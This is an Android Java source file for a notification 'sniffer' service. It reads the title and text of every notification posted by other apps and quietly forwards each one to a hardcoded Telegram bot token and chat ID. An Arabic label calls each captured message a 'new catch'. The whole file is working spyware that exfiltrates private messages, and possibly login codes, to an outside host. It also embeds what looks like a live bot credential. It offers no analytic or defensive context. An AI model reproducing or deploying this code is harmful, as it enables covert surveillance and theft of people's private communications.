package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.util.Log;
import okhttp3.*;
import java.io.IOException;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn.getPackageName().equals("android")) return;

        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        Object textObj = extras.get(Notification.EXTRA_TEXT);
        String text = (textObj != null) ? textObj.toString() : "Empty Message";

        String report = "🎯 صيدة جديدة:\n" +
                        "📱 التطبيق: " + sbn.getPackageName() + "\n" +
                        "👤 المرسل: " + title + "\n" +
                        "💬 الرسالة: " + text;

        sendToTelegram(report);
    }

    private void sendToTelegram(String message) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
        Request request = new Request.Builder().url(url).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
        });
    }
}
